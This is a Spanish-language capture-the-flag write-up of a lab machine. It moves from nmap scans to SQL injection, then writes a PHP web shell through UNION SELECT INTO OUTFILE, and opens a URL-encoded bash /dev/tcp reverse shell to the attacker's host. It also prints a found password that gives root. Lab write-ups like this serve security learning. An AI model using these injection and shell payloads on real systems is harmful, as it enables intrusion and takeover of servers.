Comenzamos con un escaneo de puertos y servcios mediante la herramienta nmap 
`sudo nmap -p- --open -sS --min-rate 5000 -n -v -sV -Pn 10.10.11.116 `
![[Pasted image 20240917042101.png]]
Vamos a lanzar un escaneo de puertos mas exhaustivo 
`nmap -p 22,80,4566,8080 -sCV 10.10.11.116 `
![[Pasted image 20240917042927.png]]
Decido centrarme en  el puerto 80 , por lo que antes de visitar la web decido escanearla con la herramienta whatweb


Visitamos la web

Al ver un imput en en la web trato de provar si es vulnerable a XSS, HTML injection u sql injection.
Probamos introduciendo una etiqueta basica en html para ver si el imput es vulnerable a HTML injection.

![[Pasted image 20240918023119.png]]
![[Pasted image 20240918023131.png]]

Vemos que si lo es, veamos si es vulnerable a XSS introduciendo un alert() en el imput
![[Pasted image 20240918023217.png]]
![[Pasted image 20240918023223.png]]

Vemos que si, pero al no estar autenticado no podemos aprobecharlo.
Probamos algo como admin' para ver si con la comilla podemos detectar si es vulnerable a sql injection.
![[Pasted image 20240918023243.png]]
Parece ser que no, al no encontrar nada relevante en la web, veamos si podemos encontrar algo interesante en la petición.
![[Pasted image 20240918023615.png]]
Vemos que la peticion post manda nuestro imput de username y el de country, si añadimos una comilla al final de la peticion podremos ver si es vulnerble a una  injeccion sql.
Mandamos la peticion al repiter, añadimos la comilla y le damos a a send
![[Pasted image 20240918023942.png]]
Vemos  que a la derecha no vemos nada, pero si observamos la web vemos un error que nos verifica la injección sql.
![[Pasted image 20240918024022.png]]
Veamos el nombre de la bse de datos en cuestion
![[Pasted image 20240918024158.png]]
![[Pasted image 20240918024220.png]]
Al ver que responde con el nombre de la base de datos, veamos si podemos mostrar un contenido alojado en un archivo que nosotros subamos desde una injeccion, suponiendo que la ruta del servidor web donde esta alojado account.php es /var/www/html/

Subremos un archivo de prueba para ver si podemos mostrar el contenido desde la web

![[Pasted image 20240918025700.png]]
![[Pasted image 20240918032124.png]]
Probamos a introducir un código php que ejcute una cmd y guardarlo en un binario php
`' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/prueba.php"-- -`
![[Pasted image 20240918034528.png]]
![[Pasted image 20240918034552.png]]
![[Pasted image 20240918034609.png]]
Tenemos RCE, por lo que intentaremos lanzar una reverse shell, pero no podemos añadirla como tal, debemos codificarla como URL para añadirla


![[Pasted image 20240918034915.png]]
Copiamos el contenido y lo añadimos al navegador mientras estamos en escucha por el puerto especificado
`%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%35%31%2f%34%34%34%34%20%30%3e%26%31%27`
![[Pasted image 20240918035033.png]]
Ya tenemos acceso, tras un tratamiento de la tty, listamos el contenido donde nos encontramos

![[Pasted image 20240918041016.png]]
Veamos el contenido de config.php
![[Pasted image 20240918041121.png]]
`uhc-9qual-global-pw`

Encontramos una contraseña, vayamos a por la user flag, nos dirigimos al directorio del usuario
USER FLAG
![[Pasted image 20240918041220.png]]
Podemos ver la user flag sin necesidad de cambiar de usuario, por lo que alomejor la contraseña que hemos encontrado es del usuario root
ESCALADA DE PRIVILEGIOS
Veamos si podemos acceder al usuario root con la contraseña encontrada
![[Pasted image 20240918041359.png]]
Ya somos root, vamos a por la root flag
ROOT FLAG
![[Pasted image 20240918041441.png]]